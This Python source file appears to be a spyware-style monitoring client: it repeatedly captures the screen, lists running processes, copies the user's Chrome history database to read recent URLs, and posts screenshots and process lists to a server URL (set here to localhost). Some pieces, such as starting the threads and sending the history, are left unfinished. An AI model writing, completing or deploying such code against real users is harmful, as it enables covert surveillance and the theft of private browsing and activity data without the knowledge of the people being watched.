import mss
import pickle
import mss.tools
import requests
from time import sleep
from zlib import compress
import psutil
import threading
import sqlite3
from shutil import copyfile
import getpass

SERVER_URL = "http://127.0.0.1:5000"

class ProcessDetails:
    def __init__(self):
        pass

    def get_running_processes(self):
        """Returning a list of the current running processes in the computer"""
        self.running_programs = []
        pid = []
        name = []
        for running_program in psutil.process_iter():
            infoDict = running_program.as_dict(attrs=['pid', 'name'])
            self.running_programs.append(infoDict)
            pid.append(infoDict["pid"])
            name.append(infoDict["name"])
        return self.running_programs, pid, name


class ScreenShot:
    def __init__(self):
        pass
    
    def send_screenshot(self):
        """Sending the screenshots to the server as long as the picture actually changes"""
        first_occu = 0
        prev_img = ""
        with mss.mss() as sct:
            while True:
                first_occu = first_occu + 1
                # Use the 1st monitor
                sct.compression_level = 1
                monitor = sct.monitors[1]
                # Grab the picture
                im = sct.grab(monitor)
                if first_occu == 1:
                    prev_img = im
                # Get the entire PNG raw bytes
                raw_bytes = mss.tools.to_png(im.rgb, im.size, level=1)
                if raw_bytes != prev_img:
                    requests.post(SERVER_URL  + '/get_file', data=raw_bytes,headers={'Content-Type': 'application/octet-stream'})
                prev_img = raw_bytes

class SendToServer:
    def __init__(self, send_request_to):
        self.send_request_to = send_request_to

    def send_computer_details(self, running_proc, com_history):
        """send the data of the computer (without the screenshot)

        running_proc -- the object of the class "ProcessDetails"
        """
        while True: # TD: add com_history
            requests.post(self.send_request_to, json={"running processes": running_proc.get_running_processes()[0]})
            sleep(5) # sending the data every 5 seconds


class GetHistory:
    def __init__(self):
        pass

    def get_chrome_history(self):
        """Getting the user's chrome history from the DB and returning the 10 most recent history results"""
        user = getpass.getuser()
        history = "C:\\Users\\" + user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        copyfile(history, '.\\ChromeHistoryCopy')
        con = sqlite3.connect('.\\ChromeHistoryCopy')
        cursor = con.cursor()
        sql_select = """ SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime'),
                                url 
                        FROM urls
                        ORDER BY last_visit_time DESC
                    """
        cursor.execute(sql_select)
        urls = cursor.fetchall()
        show_rec_10 = 0
        for i in urls:
            show_rec_10 = show_rec_10 + 1
            if show_rec_10 <= 10:
                i = str(i)
                if i.find("chrome-extension") == -1:
                    yield i
    
    def get_DNS_records(self):
        """TD if I find it necessary"""
        pass

def main():
    
    screen = ScreenShot()
    running_proc = ProcessDetails()
    server_send = SendToServer(SERVER_URL)
    com_history = GetHistory()
    send_details = threading.Thread(target=server_send.send_computer_details, args=[running_proc, com_history])
    send_screenshots = threading.Thread(target=screen.send_screenshot)
    # screen.send_screenshot()

if __name__ == "__main__":
    main()
